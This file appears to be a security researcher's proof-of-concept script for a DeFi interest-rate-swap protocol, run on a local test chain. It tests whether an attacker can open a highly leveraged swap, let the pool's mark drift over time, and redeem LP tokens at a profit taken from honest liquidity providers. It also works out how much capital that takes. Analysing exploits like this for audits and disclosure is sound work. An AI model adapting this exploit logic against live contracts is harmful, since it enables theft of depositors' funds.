// Can the attack be made atomic (flash loan) or does the attacker have to lock capital?
// Every number below is produced by the real contracts deployed by poc.js.
const { main, RISK_BASE, signRisk, E18, PAD } = require('./poc');
const { soapAt, exchangeRate } = require('./soap');

const TENOR = 2n, DAYS = 90n, INDEX = 5n * 10n ** 16n;
const f = (x) => (Number(x) / 1e6).toLocaleString('en-US', { maximumFractionDigits: 2 });
const f18 = (x) => (Number(x) / 1e18).toLocaleString('en-US', { maximumFractionDigits: 2 });

async function setup({ honestUsdc, atkUsdc, collateralUsdc, leverage = 1000n * E18, days = 90 }) {
    const tenor = { 28: 0n, 60: 1n, 90: 2n }[days];
    const c = await main({ openingFeeRate: 5n * 10n ** 14n });
    const { P, usdc, ipToken, oracle, ammStorage, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
    const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
    await c.give(lp, PAD(honestUsdc));
    await c.give(atk, PAD(atkUsdc) + PAD(200_000));
    if (honestUsdc) await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(honestUsdc), { gasLimit: 5e6 })).wait();
    if (atkUsdc) await (await pools.connect(atk).provideLiquidityUsdc(atkAddr, PAD(atkUsdc), { gasLimit: 5e6 })).wait();
    await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();

    const k = (leverage * 5n * 10n ** 14n * BigInt(days)) / (365n * E18);
    const totalUsdc = ((PAD(collateralUsdc) * 10n ** 12n * (E18 + k)) / E18 + 35n * E18) * 10n ** 6n / E18 + 2n;
    await c.give(atk, totalUsdc);
    const now = BigInt((await provider.getBlock('latest')).timestamp);
    const ins = { ...RISK_BASE, expiration: now + 3600n };
    await (await openViaRouter.connect(atk)[`openSwapReceiveFixed${days}daysUsdc`](
        atkAddr, totalUsdc, 0n, leverage,
        { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, tenor, 1n) }, { gasLimit: 9e6 }
    )).wait();

    const rate = async (ts) => {
        const [pf, rf] = await ammStorage.getSoapIndicators();
        const ibt = await oracle.calculateAccruedIbtPrice(P.usdc, ts);
        const b = await ammStorage.getBalance();
        const s = soapAt(pf, rf, ts, ibt);
        const supply = await ipToken.totalSupply();
        return { ...s, rate: exchangeRate(b.liquidityPool, s.soap, supply), supply, liquidityPool: BigInt(b.liquidityPool) };
    };
    return { c, rate, atk, lp, atkIp: await ipToken.balanceOf(atkAddr), atkAddr, lpAddr, totalUsdc, P, usdc, ipToken, pools, provider, ammStorage, oracle };
}

(async () => {
    // ---------------------------------------------------------------- A. is there an instant mark?
    console.log('=== A. right after the swap is opened (same block) ===');
    {
        const s = await setup({ honestUsdc: 1_000_000, atkUsdc: 500_000, collateralUsdc: 74_000 });
        const t0 = BigInt((await s.provider.getBlock('latest')).timestamp);
        const r = await s.rate(t0);
        console.log(`t+0      soap=${f18(r.soap)}  rate=${(Number(r.rate) / 1e18).toFixed(6)}  <- the mark is exactly zero, there is nothing to redeem`);
        // validate the off-chain model against the protocol's own redeem price
        const before = await s.usdc.balanceOf(s.atkAddr);
        await (await s.pools.connect(s.atk).redeemFromAmmPoolUsdc(s.atkAddr, E18, { gasLimit: 9e6 })).wait();
        const out = (await s.usdc.balanceOf(s.atkAddr)) - before;
        console.log(`protocol redeem of 1 ipUSDC now pays ${f(out)} USDC -> on-chain rate ${(Number(out) / 1e6).toFixed(6)} (model ${(Number(r.rate) / 1e18).toFixed(6)})`);

        // ------------------------------------------------------------ B. the mark is a function of time
        console.log('\n=== B. the same swap, marked at later timestamps (no state change) ===');
        for (const [label, secs] of [['+1 hour', 3600n], ['+1 day', 86400n], ['+7 days', 7n * 86400n], ['+28 days', 28n * 86400n], ['+90 days', 90n * 86400n]]) {
            const r2 = await s.rate(t0 + secs);
            console.log(`${label.padEnd(9)} soap=${f18(r2.soap).padStart(12)}  rate=${(Number(r2.rate) / 1e18).toFixed(6)}  marked_gain_of_a_500k_LP=${f18(((r2.rate - E18) * (500_000n * 10n ** 12n)) / E18)}`);
        }
    }

    // ---------------------------------------------------------------- C. mirror image: pay fixed
    console.log('\n=== C. mirror: a pay-fixed swap marks the pool down instead (also starts at 0) ===');
    {
        const c = await main({ openingFeeRate: 5n * 10n ** 14n });
        const { P, usdc, ipToken, oracle, ammStorage, provider, atk, lp, msgSignerWallet, pools, openViaRouter } = c;
        const atkAddr = await atk.getAddress(), lpAddr = await lp.getAddress();
        await c.give(lp, PAD(1_000_000)); await c.give(atk, PAD(700_000));
        await (await pools.connect(lp).provideLiquidityUsdc(lpAddr, PAD(1_000_000), { gasLimit: 5e6 })).wait();
        await (await oracle.updateIndexes([{ asset: P.usdc, indexValue: INDEX, updateTimestamp: 0n, quasiIbtPrice: 0n }])).wait();
        const totalUsdc = 83_158_287_673n;
        await c.give(atk, totalUsdc);
        const now = BigInt((await provider.getBlock('latest')).timestamp);
        const ins = { ...RISK_BASE, expiration: now + 3600n };
        await (await openViaRouter.connect(atk).openSwapPayFixed90daysUsdc(atkAddr, totalUsdc, 10n ** 18n, 1000n * E18,
            { ...ins, signature: signRisk(msgSignerWallet, ins, P.usdc, TENOR, 0n) }, { gasLimit: 9e6 })).wait();
        const swap = await ammStorage.getSwap(0, 1);
        console.log(`pay-fixed opened: notional=${f(BigInt(swap.notional))} fixed=${(Number(swap.fixedInterestRate) / 1e16).toFixed(3)}%`);
        const t0 = BigInt((await provider.getBlock('latest')).timestamp);
        for (const [label, secs] of [['t+0', 0n], ['+90 days', 90n * 86400n]]) {
            const [pf, rf] = await ammStorage.getSoapIndicators();
            const ibt = await oracle.calculateAccruedIbtPrice(P.usdc, t0 + secs);
            const b = await ammStorage.getBalance();
            const s = soapAt(pf, rf, t0 + secs, ibt);
            const supply = await ipToken.totalSupply();
            console.log(`${label.padEnd(9)} soap=${f18(s.soap).padStart(14)}  rate=${(Number(exchangeRate(b.liquidityPool, s.soap, supply)) / 1e18).toFixed(6)}`);
        }
    }

    // ---------------------------------------------------------------- D. how much capital does an attacker really need?
    console.log('\n=== D. capital scenarios, 90d, collateral 74k, 1000x, 5% index ===');
    for (const atkUsdc of [0, 50_000, 100_000, 250_000, 500_000]) {
        try {
            const s = await setup({ honestUsdc: 1_000_000, atkUsdc, collateralUsdc: 74_000 });
            await s.provider.send('evm_increaseTime', [Number(DAYS) * 86400 + 60]);
            await s.provider.send('evm_mine', []);
            let got = 0n;
            const ip = await s.ipToken.balanceOf(s.atkAddr);
            if (ip > 0n) {
                const before = await s.usdc.balanceOf(s.atkAddr);
                try { await (await s.pools.connect(s.atk).redeemFromAmmPoolUsdc(s.atkAddr, ip, { gasLimit: 9e6 })).wait(); } catch (e) { }
                got = (await s.usdc.balanceOf(s.atkAddr)) - before;
            }
            const cash = await s.usdc.balanceOf(s.P.treasury);
            const profit = got - PAD(atkUsdc) - s.totalUsdc;
            console.log(`atk_lp=${f(PAD(atkUsdc)).padStart(9)}  spent=${f(PAD(atkUsdc) + s.totalUsdc).padStart(10)}  redeemed=${f(got).padStart(10)}  NET=${(profit > 0n ? '+' : '-') + f(profit < 0n ? -profit : profit)}  honest_lp_left=${f(cash)}`);
        } catch (e) { console.log(`atk_lp=${f(PAD(atkUsdc))} failed: ${e.shortMessage || e.message}`); }
    }
})().catch((e) => console.error('FAIL', e.shortMessage || e.message));
